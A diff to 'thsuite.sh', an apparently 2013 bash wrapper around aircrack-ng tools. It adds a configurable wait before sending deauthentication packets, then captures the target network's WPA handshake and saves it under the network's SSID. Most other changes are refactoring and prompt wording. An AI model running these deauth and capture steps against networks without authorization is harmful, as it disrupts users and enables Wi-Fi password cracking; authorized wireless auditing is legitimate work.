@@ -2,7 +2,7 @@
 #THS Wireless Suite
 #thsuite.sh v0.1
 #By TAPE
-#Last edit 14-08-2013 02:30 
+#Last edit 14-08-2013 13:00 
 #Written on THS-OS v3 (CR4CK3RB0X) and Kali Linux
 #Tested on both with some options performing better on Kali
 #Source: http://thsuite.googlecode.com/svn/thsuite.sh
@@ -33,17 +33,7 @@ if [ ! -e /root/THS_TMP/ ] ; then mkdir /root/THS_TMP/ ; fi
 trap f_ctrl_c INT
 #
 f_exit() {
-if [ -e /root/THS_TMP/handshake_list.tmp ] ; then rm /root/THS_TMP/handshake_list.tmp ; fi 
-if [ -e /root/THS_TMP/pyrit_cap_analyze.tmp ] ; then rm /root/THS_TMP/pyrit_cap_analyze.tmp ; fi
-if [ -e /root/THS_TMP/csvfile_ap.tmp ] ; then rm /root/THS_TMP/csvfile_ap.tmp ; fi
-if [ -e /root/THS_TMP/csvfile_cl.tmp ] ; then rm /root/THS_TMP/csvfile_cl.tmp ; fi
-if [ -e /root/THS_TMP/wpa_temp-01.cap ] ; then rm /root/THS_TMP/wpa_temp* ; fi
-if [ -e /root/THS_TMP/scan_assist.tmp ] ; then rm /root/THS_TMP/scan_assist.tmp ; fi
-if [ -e /root/THS_TMP/ssid_list.tmp ] ; then rm /root/THS_TMP/ssid_list.tmp ; fi
-if [ -e /root/THS_TMP/trash.tmp ] ; then rm /root/THS_TMP/trash.tmp ; fi
-if [ -e "$THSDIR"blacklist.tmp ] ; then rm "$THSDIR"blacklist.tmp ; fi
-if [ -e "$THSDIR"whitelist.tmp ] ; then rm "$THSDIR"whitelist.tmp ; fi
-if [ -e /root/THS_TMP/handshake_list_full.tmp ] ; then rm /root/THS_TMP/handshake_list_full.tmp ; fi
+f_clean
 echo $STD""
 exit 0
 }
@@ -82,17 +72,17 @@ f_exit
 ### MAKE SURE NO TEMP FILES REMAINING BEFORE START FUNCTION
 ###########################################################
 f_clean() { 
-if [ -e /root/THS_TMP/handshake_list.tmp ] ; then rm /root/THS_TMP/handshake_list.tmp ; fi
-if [ -e /root/THS_TMP/pyrit_cap_analyze.tmp ] ; then rm /root/THS_TMP/pyrit_cap_analyze.tmp ; fi
-if [ -e /root/THS_TMP/csvfile_ap.tmp ] ; then rm /root/THS_TMP/csvfile_ap.tmp ; fi
-if [ -e /root/THS_TMP/csvfile_cl.tmp ] ; then rm /root/THS_TMP/csvfile_cl.tmp ; fi
-if [ -e /root/THS_TMP/wpa_temp-01.cap ] ; then rm /root/THS_TMP/wpa_temp* ; fi
-if [ -e /root/THS_TMP/scan_assist.tmp ] ; then rm /root/THS_TMP/scan_assist.tmp ; fi
-if [ -e /root/THS_TMP/ssid_list.tmp ] ; then rm /root/THS_TMP/ssid_list.tmp ; fi
-if [ -e /root/THS_TMP/trash.tmp ] ; then rm /root/THS_TMP/trash.tmp ; fi
-if [ -e "$THSDIR"blacklist.tmp ] ; then rm "$THSDIR"blacklist.tmp ; fi
-if [ -e "$THSDIR"whitelist.tmp ] ; then rm "$THSDIR"whitelist.tmp ; fi
-if [ -e /root/THS_TMP/handshake_list_full.tmp ] ; then rm /root/THS_TMP/handshake_list_full.tmp ; fi
+rm -rf /root/THS_TMP/handshake_list.tmp
+rm -rf /root/THS_TMP/pyrit_cap_analyze.tmp
+rm -rf /root/THS_TMP/csvfile_ap.tmp
+rm -rf /root/THS_TMP/csvfile_cl.tmp
+rm -rf /root/THS_TMP/wpa_temp*
+rm -rf /root/THS_TMP/scan_assist.tmp
+rm -rf /root/THS_TMP/ssid_list.tmp
+rm -rf /root/THS_TMP/trash.tmp
+rm -rf "$THSDIR"blacklist.tmp
+rm -rf "$THSDIR"whitelist.tmp
+rm -rf /root/THS_TMP/handshake_list_full.tmp
 } 
 #
 ##
@@ -655,7 +645,7 @@ done < /root/THS_TMP/pyrit_cap_analyze.tmp
 	f_list_wireless
 	fi
 echo $STD""
-echo -n $STD"Strip handshakes to individual files ? y/N $GRN"
+echo -n $STD"Attempt to strip handshakes to individual files ? y/N $GRN"
 read STRIP
 if [[ "$STRIP" == "y" || "$STRIP" == "Y" ]] ; then
 f_strip
@@ -929,6 +919,7 @@ read IFACE
 	f_force_wpa
 	fi 
 #
+echo $BLUN"Required Input"$STD
 echo -n $GRN">$STD Enter target AP BSSID: $GRN"
 read TARGET_AP
 if [ "$TARGET_AP" == "" ] ; then f_force_wpa ; fi
@@ -964,6 +955,7 @@ done
 	TARGET_CL=$(echo "$TARGET_CL" | sed 's/-/:/g')
 	fi
 #
+echo $BLUN"Optional Input(hit Enter for default)"$STD
 echo -n $GRN">$STD Enter scantime duration: $GRN"
 read SCANTIME
 if [ "$SCANTIME" == "" ] ; then SCANTIME=15 ; fi
@@ -1002,23 +994,38 @@ echo -n $GRN">$STD Enter number of deauth packets to send: $GRN"
 read DEAUTHS
 if [ "$DEAUTHS" == "" ] ; then DEAUTHS=5 ; fi
 done
-echo $GRN">$STD Running airodump to capture credentials and aireplay to deauth client"
-NAME=$(echo $TARGET_AP | sed 's/:/-/g')
-FILENAME="TEMP-$NAME"
+# Waiting time before sending deauth packets 
+echo -n $GRN">$STD Enter wait time before sending deauth packets: $GRN"
+read WAIT
+if [ "$WAIT" == "" ] ; then WAIT=3 ; fi
+while [ ! `expr $WAIT + 1 2> /dev/null` ] && [ "$WAIT" != "" ] ; do
+echo $RED">$STD Input error $RED[$STD$WAIT$RED]$STD Only numeric values possible."
+echo -n $GRN">$STD Enter wait time before sending deauth packets: $GRN"
+read WAIT
+if [ "$WAIT" == "" ] ; then WAIT=3 ; fi
+done
 #
-sleep 3 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $DIFACE -0 $DEAUTHS -a $TARGET_AP -c $TARGET_CL \
-& timeout $SCANTIME xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $TARGET_CHAN --bssid $TARGET_AP --output-format cap csv -w $SAVEDIR$FILENAME
-#Rename and move capture file 
-HS_NAME=$(echo $TARGET_AP | sed 's/:/-/g')
-mv $SAVEDIR"$FILENAME"* $SAVEDIR"$HS_NAME".cap
-HANDSHAKE=$SAVEDIR"$HS_NAME".cap
+echo $GRN">$STD Running airodump to capture handshake and aireplay to deauth client"
+# Running airodump & aireplay
+sleep $WAIT && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $DIFACE -0 $DEAUTHS -a $TARGET_AP -c $TARGET_CL \
+& timeout $SCANTIME xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $TARGET_CHAN --bssid $TARGET_AP --output-format cap,csv -w "$THSDIR"wpa_temp
+# File preparation
+CAPFILE="$THSDIR"wpa_temp-01.cap
+CSVFILE="$THSDIR"wpa_temp-01.csv
+echo $GRN">$STD Stripping network SSID from capture"$STD 
+TARGET_SSID=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 14 | sed 's/[ ]//')
+# Rename and move capture file
+mv $CAPFILE $SAVEDIR"$TARGET_SSID".cap
+HANDSHAKE=$SAVEDIR"$TARGET_SSID".cap
+# tmp files deletion check
+f_clean
+#
+#
 #
 echo $STD
 echo -n $GRN">$STD Check $HANDSHAKE for handshakes? y/N $GRN"
 read CHECK
 if [[ "$CHECK" == "y" || "$CHECK" == "Y" ]] ; then
-echo $GRN">$STD Stripping network SSID from capture with tshark"$STD 
-TARGET_SSID=$(tshark -n -R wlan -r 8c-04-ff-7b-73-7b.cap | grep SSID | grep 8c:04:ff:7b:73:7b | sed -n '$p' | sed 's/^.*SSID=//')
 f_handshake_check
 else
 f_exit
